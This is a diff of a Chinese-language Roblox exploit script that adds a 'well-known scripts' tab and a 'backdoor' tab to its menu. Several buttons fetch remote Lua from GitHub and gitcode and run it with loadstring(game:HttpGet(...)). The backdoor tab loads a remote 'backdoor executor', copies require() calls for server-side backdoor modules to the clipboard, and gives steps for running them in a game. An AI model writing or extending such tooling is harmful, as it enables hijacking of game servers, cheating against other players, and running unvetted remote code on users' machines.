@@ -575,7 +575,7 @@ function initMainScript()
     )
 
     -- 使用WindUI库
-    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+    local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
 
     -- 创建窗口
     local Window = WindUI:CreateWindow({
@@ -616,26 +616,30 @@ function initMainScript()
     -- 创建各个标签页
     local Tabs = {
         Main = Window:Section({ Title = "主界面", Opened = true }),
-        Core = Window:Section({ Title = "通用", Opened = true }),
+        Core = Window:Section({ Title = "核心功能", Opened = true }),
         Teleport = Window:Section({ Title = "传送功能", Opened = true }),
         Translate = Window:Section({ Title = "极速汉化", Opened = true }),
         Strongest = Window:Section({ Title = "最强战场", Opened = true }),
         Abandoned = Window:Section({ Title = "被遗弃", Opened = true }),
         V99 = Window:Section({ Title = "99页", Opened = true }),
         DeadRails = Window:Section({ Title = "死铁轨", Opened = true }),
+        OtherKnown = Window:Section({ Title = "其他知名脚本", Opened = true }),
+        Backdoor = Window:Section({ Title = "后门", Opened = true }),
         InkGame = Window:Section({ Title = "墨水游戏", Opened = true }),
         Other = Window:Section({ Title = "其他功能", Opened = true })
     }
 
     local TabHandles = {
         Main = Tabs.Main:Tab({ Title = "主界面", Icon = "home" }),
-        Core = Tabs.Core:Tab({ Title = "通用", Icon = "zap" }),
+        Core = Tabs.Core:Tab({ Title = "核心功能", Icon = "zap" }),
         Teleport = Tabs.Teleport:Tab({ Title = "传送功能", Icon = "navigation" }),
         Translate = Tabs.Translate:Tab({ Title = "极速汉化", Icon = "languages" }),
         Strongest = Tabs.Strongest:Tab({ Title = "最强战场", Icon = "crosshair" }),
         Abandoned = Tabs.Abandoned:Tab({ Title = "被遗弃", Icon = "archive" }),
         V99 = Tabs.V99:Tab({ Title = "99页", Icon = "box" }),
         DeadRails = Tabs.DeadRails:Tab({ Title = "死铁轨", Icon = "train" }),
+        OtherKnown = Tabs.OtherKnown:Tab({ Title = "其他知名脚本", Icon = "star" }),
+        Backdoor = Tabs.Backdoor:Tab({ Title = "后门", Icon = "key" }),
         InkGame = Tabs.InkGame:Tab({ Title = "墨水游戏", Icon = "pen-tool" }),
         Other = Tabs.Other:Tab({ Title = "其他功能", Icon = "grid" })
     }
@@ -1771,6 +1775,261 @@ function initMainScript()
     TabHandles.DeadRails:Paragraph({
         Title = "注意",
         Desc = "这些脚本专为死铁轨游戏设计",
+        Image = "info",
+        ImageSize = 16,
+        Color = Color3.fromHex("#0099FF")
+    })
+
+    -- ========== 其他知名脚本标签页 ==========
+    TabHandles.OtherKnown:Paragraph({
+        Title = "其他知名脚本",
+        Desc = "加载各种知名的脚本集合",
+        Image = "star",
+        ImageSize = 20,
+        Color = Color3.fromHex("#0078D7")
+    })
+
+    TabHandles.OtherKnown:Divider()
+
+    -- KG脚本
+    TabHandles.OtherKnown:Button({
+        Title = "加载KG脚本",
+        Icon = "target",
+        Callback = function()
+            Notification:Notify(
+                {Title = "其他知名脚本", Description = "正在加载KG脚本..."},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+            
+            local success, err = pcall(function()
+                KG_SCRIPT = "张硕制作"
+                loadstring(game:HttpGet("https://github.com/ZS-NB/KG/raw/main/Zhang-Shuo.lua"))()
+            end)
+            
+            if success then
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "KG脚本加载成功！"},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            else
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "KG脚本加载失败: " .. tostring(err)},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            end
+        end
+    })
+
+    -- 叶脚本
+    TabHandles.OtherKnown:Button({
+        Title = "加载叶脚本",
+        Icon = "leaf",
+        Callback = function()
+            Notification:Notify(
+                {Title = "其他知名脚本", Description = "正在加载叶脚本..."},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+            
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua"))()
+            end)
+            
+            if success then
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "叶脚本加载成功！"},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            else
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "叶脚本加载失败: " .. tostring(err)},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            end
+        end
+    })
+
+    -- 皮脚本
+    TabHandles.OtherKnown:Button({
+        Title = "加载皮脚本",
+        Icon = "user",
+        Callback = function()
+            Notification:Notify(
+                {Title = "其他知名脚本", Description = "正在加载皮脚本..."},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+            
+            local success, err = pcall(function()
+                getgenv().XiaoPi="皮脚本QQ群1002100032" 
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
+            end)
+            
+            if success then
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "皮脚本加载成功！"},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            else
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "皮脚本加载失败: " .. tostring(err)},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            end
+        end
+    })
+
+    -- XA脚本
+    TabHandles.OtherKnown:Button({
+        Title = "加载XA脚本",
+        Icon = "zap",
+        Callback = function()
+            Notification:Notify(
+                {Title = "其他知名脚本", Description = "正在加载XA脚本..."},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+            
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://raw.gitcode.com/Xingtaiduan/Scripts/raw/main/Loader.lua"))()
+            end)
+            
+            if success then
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "XA脚本加载成功！"},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            else
+                Notification:Notify(
+                    {Title = "其他知名脚本", Description = "XA脚本加载失败: " .. tostring(err)},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            end
+        end
+    })
+
+    TabHandles.OtherKnown:Paragraph({
+        Title = "提示",
+        Desc = "这些是各种知名的脚本集合",
+        Image = "info",
+        ImageSize = 16,
+        Color = Color3.fromHex("#0099FF")
+    })
+
+    -- ========== 后门标签页 ==========
+    TabHandles.Backdoor:Paragraph({
+        Title = "后门执行器",
+        Desc = "各种后门执行器脚本",
+        Image = "key",
+        ImageSize = 20,
+        Color = Color3.fromHex("#0078D7")
+    })
+
+    TabHandles.Backdoor:Divider()
+
+    -- 后门执行器脚本
+    TabHandles.Backdoor:Button({
+        Title = "加载后门执行器",
+        Icon = "download",
+        Callback = function()
+            Notification:Notify(
+                {Title = "后门", Description = "正在加载后门执行器..."},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+            
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+            end)
+            
+            if success then
+                Notification:Notify(
+                    {Title = "后门", Description = "后门执行器加载成功！"},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            else
+                Notification:Notify(
+                    {Title = "后门", Description = "后门执行器加载失败: " .. tostring(err)},
+                    {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+                )
+            end
+        end
+    })
+
+    -- 后门一
+    TabHandles.Backdoor:Button({
+        Title = "复制后门一代码",
+        Icon = "copy",
+        Callback = function()
+            local code = 'require(6858594080).KrnKidsSus("用户")'
+            setclipboard(code)
+            Notification:Notify(
+                {Title = "后门", Description = "后门一代码已复制到剪贴板！"},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+        end
+    })
+
+    -- 后门二
+    TabHandles.Backdoor:Button({
+        Title = "复制后门二代码",
+        Icon = "copy",
+        Callback = function()
+            local code = 'require(14125553864):Fire("用户", "c00lkidd")'
+            setclipboard(code)
+            Notification:Notify(
+                {Title = "后门", Description = "后门二代码已复制到剪贴板！"},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+        end
+    })
+
+    -- 后门三
+    TabHandles.Backdoor:Button({
+        Title = "复制后门三代码",
+        Icon = "copy",
+        Callback = function()
+            local code = 'require(14829670677).EDITL0L("用户")'
+            setclipboard(code)
+            Notification:Notify(
+                {Title = "后门", Description = "后门三代码已复制到剪贴板！"},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+        end
+    })
+
+    -- 后门四
+    TabHandles.Backdoor:Button({
+        Title = "复制后门四代码",
+        Icon = "copy",
+        Callback = function()
+            local code = 'require(78790302691160):Hload("用户")'
+            setclipboard(code)
+            Notification:Notify(
+                {Title = "后门", Description = "后门四代码已复制到剪贴板！"},
+                {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 5, Type = "image"},
+                {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
+            )
+        end
+    })
+
+    TabHandles.Backdoor:Paragraph({
+        Title = "使用说明",
+        Desc = "1. 先加载后门执行器\n2. 然后复制相应的后门代码\n3. 在游戏中执行复制的代码",
         Image = "info",
         ImageSize = 16,
         Color = Color3.fromHex("#0099FF")
